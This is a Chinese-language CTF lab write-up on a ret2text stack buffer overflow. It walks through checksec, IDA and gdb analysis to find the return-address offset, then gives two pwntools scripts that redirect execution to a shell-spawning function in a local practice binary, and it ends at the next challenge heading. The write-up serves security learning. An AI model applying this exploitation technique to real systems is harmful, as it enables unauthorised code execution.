实验环境：

* Ubuntu 22.04.2
* python 3.10.6
* pwntools 4.9.0
* gdb 12.1(pwndbg 2023.03.19) 

# ret2text

## 检查安全机制

checksec检查题目文件的保护机制：

![image-20230415192714541](md.image/report/image-20230415192714541.png)

发现开启了NX，说明不能直接在栈上写shellcode

## 程序分析

IDA反汇编查看伪代码，发现了溢出点

![image-20230415192840938](md.image/report/image-20230415192840938.png)

变量`s`使用`gets`函数填充，存在溢出风险，能覆盖`main`函数的返回地址

> 做题的时候这里有个误解，以为要溢出覆盖的是`gets`函数的返回地址
> 经检查后发现，`s`是作为`main`函数的局部变量，存在于`main`函数的栈帧中，因此溢出覆盖的是`mian`函数的返回地址

检查程序其他代码，发现有能直接getshell的代码

![image-20230415194749193](md.image/report/image-20230415194749193.png)

开始执行这段代码的地址是0x0804863A，因此用这个位置覆盖掉`main`函数的返回地址就能getshell

![image-20230415194846045](md.image/report/image-20230415194846045.png)

下面要计算`s`到`$ebp`的距离，有两种方法



**1 从IDA中获取**

~~IDA反汇编直接就给出了`s`相对于`$ebp`的偏移是-0x64~~

![image-20230415200653083](md.image/report/image-20230415200653083.png)

~~因此`main`函数的返回地址的末尾就是0x64 + 0x04(`$ebp`) = 0x68。栈结构图如下：~~

> 这里踩了坑，这里给出的变量`s`相对于`$ebp`的距离0x64是不对的，得查看程序中具体的对`s`的寻址方式
> 回到汇编代码中，可以看到`s`的寻址方式是根据`$esp`的寻址
>
> ![image-20230415211314364](md.image/report/image-20230415211314364.png)
>
> 这种情况就还是要用动态调试找出`s`与`$ebp`之间的距离



可以看到，`s`相对于`$esp`的距离是0x1c，找出程序运行`gets`前`$esp`的值，即可计算`s`的地址

找出调用`gets`的代码地址为0x080486AE

![image-20230415194002362](md.image/report/image-20230415194002362.png)

gdb在此处下断点

![image-20230415194132937](md.image/report/image-20230415194132937.png)

“r”命令运行程序，到断点处中断，找出此时`$esp`的值是0xffffd580，`$ebp`的值是0xffffd608

![image-20230415194417691](md.image/report/image-20230415194417691.png)

因此`$ebp`到`s`的距离是(0xffffd608 - (0xffffd580 + 0x1c))，再加0x04覆盖掉`main`的栈基址内容，就是`mian`函数的返回地址。得到栈结构如下：

![ret2text-2](md.image/report/ret2text-2.png)

 

**2 根据函数调用特点**

调用`gets`之前需要将`s`的地址写入`$eax`，因此可以动态调试出`s`的地址。下图的汇编代码证实了这点：

![image-20230415213502123](md.image/report/image-20230415213502123.png)

因此同上一种方法一样，在`gets`函数调用处下断点，再运行程序，查看此时`$eax`的值为0xffffd59c，`$ebp`的值是0xffffd608

![image-20230415213716772](md.image/report/image-20230415213716772.png)

因此`s`到`$ebp`的距离为(0xffffd608 - 0xffffd59c)，再加0x04覆盖掉`main`的栈基址内容，就是`mian`函数的返回地址。得到栈结构如下：

![ret2text-3](md.image/report/ret2text-3.png)

## payload

第一种方法：

```python
from pwn import *
import pwnlib.util.packing

sh = process("./ret2text")

addr_shell = 0x0804863A
addr_esp = 0xffffd580
addr_ebp = 0xffffd608
offset_esp = 0x1c

len_ebp = addr_ebp - (addr_esp + offset_esp)

payload = b'a'*len_ebp + b'bbbb' + packing.p32(addr_shell)

sh.sendline(payload)
sh.interactive()
```

执行结果如下：

![image-20230415213036806](md.image/report/image-20230415213036806.png)

第二种方法可以得到同样的结果：

```python
from pwn import *
import pwnlib.util.packing

sh = process("./ret2text")

addr_shell = 0x0804863A
addr_ebp = 0xffffd608
addr_s = 0xffffd59c

len_ebp = addr_ebp - addr_s

payload = b'a'*len_ebp + b'bbbb' + packing.p32(addr_shell)

sh.sendline(payload)
sh.interactive()
```

# ret2shellcode

